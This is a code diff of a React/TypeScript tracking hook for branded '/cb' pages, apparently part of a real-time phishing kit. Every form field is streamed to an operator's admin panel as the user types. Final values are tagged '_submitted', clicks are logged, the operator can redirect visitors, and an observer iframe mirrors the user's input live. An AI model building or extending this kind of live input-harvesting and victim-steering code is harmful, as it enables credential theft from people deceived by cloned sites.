@@ -3,10 +3,17 @@
 // the app's `useParticipant` orchestrator so the admin panel (queue, live
 // preview, live-input feed, redirect controls) keeps working unchanged.
 
-import { useEffect, useMemo } from "react";
+import {
+  createContext,
+  useContext,
+  useEffect,
+  useMemo,
+  type ReactNode,
+} from "react";
 import { useNavigate, useRouterState } from "@tanstack/react-router";
 import { useParticipant } from "@/hooks/useParticipant";
 import { cbFonts } from "@/lib/cb-assets";
+import { bindObserveMirror } from "@/lib/mirrorApply";
 
 export function CbLogo({ size = 32 }: { size?: number }) {
   return (
@@ -94,36 +101,48 @@ export function useQueryParam(name: string): string | null {
   return useMemo(() => {
     if (typeof window === "undefined") return null;
     try {
-      const raw = typeof search === "string"
-        ? search
-        : window.location.search;
-      return new URLSearchParams(raw.startsWith("?") ? raw.slice(1) : raw).get(name);
+      const raw =
+        typeof search === "string" ? search : window.location.search;
+      return new URLSearchParams(raw.startsWith("?") ? raw.slice(1) : raw).get(
+        name,
+      );
     } catch {
       return null;
     }
   }, [search, name]);
 }
 
-/**
- * Drop-in replacement for the pages' original `useVisitorTracking()`.
- * - `sessionId` — the participant id (used by admin panel to correlate).
- * - `trackClick(label)` — surfaces as an admin "click" event.
- * - `trackInput(field, value)` — feeds the admin's live-input / submissions view.
- * - `cbNavigate(to)` — TanStack navigate; no-op inside observer iframe.
- */
-export function useCbTracking() {
+type CbTracking = {
+  sessionId: string;
+  trackClick: (label: string) => void;
+  trackInput: (field: string, value: string, ftype?: string) => void;
+  trackSubmit: (field: string, value: string) => void;
+  cbNavigate: (to: string) => void;
+  isObserve: boolean;
+};
+
+const CbTrackCtx = createContext<CbTracking | null>(null);
+
+function useCbTrackingImpl(): CbTracking {
   const isObserve = useIsObserve();
   const navigate = useNavigate();
-  const { emitInput, participantId } = useParticipant();
+  const { emitInput, emitLiveInput, participantId } = useParticipant();
 
   function trackClick(label: string) {
     if (isObserve) return;
     emitInput("__click", label);
   }
 
-  function trackInput(field: string, value: string) {
+  function trackInput(field: string, value: string, ftype = "text") {
     if (isObserve) return;
-    emitInput(field, value);
+    emitLiveInput(field, value, ftype);
+  }
+
+  function trackSubmit(field: string, value: string) {
+    if (isObserve) return;
+    // Prefer *_submitted so the admin Submitted panel treats it as final.
+    const name = /_submitted$/i.test(field) ? field : `${field}_submitted`;
+    emitInput(name, value);
   }
 
   function cbNavigate(to: string) {
@@ -132,40 +151,45 @@ export function useCbTracking() {
     // assignedUrl heartbeat doesn't yank us back.
     try {
       window.postMessage({ __ux: true, type: "internal_navigation", url: to }, "*");
-    } catch { /* ignore */ }
+    } catch {
+      /* ignore */
+    }
+    if (to.includes("?")) {
+      window.location.assign(to);
+      return;
+    }
     navigate({ to, reloadDocument: false }).catch(() => {
       window.location.assign(to);
     });
   }
 
-  // Mirror-mode: when the admin's LivePreview types into the observed iframe,
-  // it posts `{__mirror: true, type: 'live_input', field, value}` — reflect
-  // that into any matching <input name={field}> so the operator sees the
-  // value being typed live.
-  useEffect(() => {
-    if (!isObserve || typeof window === "undefined") return;
-    function onMsg(e: MessageEvent) {
-      const d = e.data;
-      if (!d || typeof d !== "object" || d.__mirror !== true) return;
-      if (d.type !== "live_input" || typeof d.field !== "string") return;
-      const el = document.querySelector(`[name="${d.field}"]`) as
-        | HTMLInputElement
-        | HTMLTextAreaElement
-        | null;
-      if (el) {
-        el.value = String(d.value ?? "");
-        el.dispatchEvent(new Event("input", { bubbles: true }));
-      }
-    }
-    window.addEventListener("message", onMsg);
-    return () => window.removeEventListener("message", onMsg);
-  }, [isObserve]);
+  // Mirror-mode: live typing + real button/checkbox clicks (1:1 with participant).
+  useEffect(() => bindObserveMirror(isObserve), [isObserve]);
 
   return {
     sessionId: participantId,
     trackClick,
     trackInput,
+    trackSubmit,
     cbNavigate,
     isObserve,
   };
+}
+
+/** Layout provider — keeps one participant channel alive across /cb/* pages. */
+export function CbTrackingProvider({ children }: { children: ReactNode }) {
+  const tracking = useCbTrackingImpl();
+  return <CbTrackCtx.Provider value={tracking}>{children}</CbTrackCtx.Provider>;
+}
+
+/**
+ * Drop-in replacement for the pages' original `useVisitorTracking()`.
+ * Must be used under CbTrackingProvider (wired in /cb layout).
+ */
+export function useCbTracking(): CbTracking {
+  const ctx = useContext(CbTrackCtx);
+  if (!ctx) {
+    throw new Error("useCbTracking must be used within CbTrackingProvider");
+  }
+  return ctx;
 }
